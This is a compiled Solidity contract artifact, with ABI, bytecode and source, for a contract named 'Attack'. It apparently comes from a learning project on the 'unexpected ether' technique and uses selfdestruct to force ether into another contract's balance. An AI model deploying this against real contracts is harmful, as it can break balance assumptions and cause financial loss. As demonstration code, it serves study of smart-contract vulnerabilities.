{
  "contractName": "Attack",
  "abi": [
    {
      "stateMutability": "payable",
      "type": "fallback",
      "payable": true
    },
    {
      "inputs": [
        {
          "internalType": "address payable",
          "name": "beneficiary",
          "type": "address"
        }
      ],
      "name": "destruct",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "getBalance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b5060f88061001f6000396000f3fe60806040526004361060295760003560e01c806312065fe014602c5780631beb261514605457602a565b5b005b348015603757600080fd5b50603e60a1565b6040518082815260200191505060405180910390f35b348015605f57600080fd5b50609f60048036036020811015607457600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505060a9565b005b600047905090565b8073ffffffffffffffffffffffffffffffffffffffff16fffea26469706673582212207b8b78fc0ce926c6831ee75556b86cc92bd1243fba2b395693d7f754f6d596d264736f6c63430007000033",
  "immutableReferences": {},
  "source": "pragma solidity ^0.7.0;\n\ncontract Attack {\n  // selfdestruct contract and send remaining ether in this contract to beneficiary (which is another contract address)\n  function destruct(address payable beneficiary) public {\n    selfdestruct(beneficiary);\n  }\n\n  // get balance of contract\n  function getBalance() public view returns (uint256) {\n    return address(this).balance;\n  }\n\n  fallback() external payable {\n\n  }\n}",
  "sourcePath": "/home/sid/repos/web3/unexpected-ether/contracts/Attack.sol",
  "compiler": {
    "name": "solc",
    "version": "0.7.0+commit.9e61f92b.Emscripten.clang"
  },
  "schemaVersion": "3.3.2",
  "updatedAt": "2020-11-19T07:42:55.232Z",
  "networkType": "ethereum",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}